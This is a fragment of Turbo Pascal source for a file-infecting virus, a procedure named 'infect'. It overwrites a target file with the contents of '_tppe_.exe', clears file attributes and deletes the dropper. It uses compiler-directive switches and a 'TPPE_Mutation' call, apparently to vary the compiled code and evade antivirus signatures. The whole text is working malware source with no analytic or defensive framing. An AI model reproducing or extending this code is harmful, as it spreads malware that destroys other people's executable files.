procedure infect(st:string);
var v,g:file;
    a:byte;
begin
{$IFOPT S-}TPPE_Mutation;{$ENDIF}
assign(v,'_tppe_.exe');
{$IFOPT B+}assign(g,st);reset(v,1);{$ELSE}assign(g,st);{$ENDIF}
setfattr(g,$20);
reset(g,1);
{$IFOPT B-}reset(v,1);{$ENDIF}
while not eof(v) do
  begin
  blockread(v,a,1);
  blockwrite(g,a,1);
  end;
{$IFOPT V+}close(g);{$ENDIF}
close(v);
erase(v);
{$IFOPT V-}close(g);{$ENDIF}
end;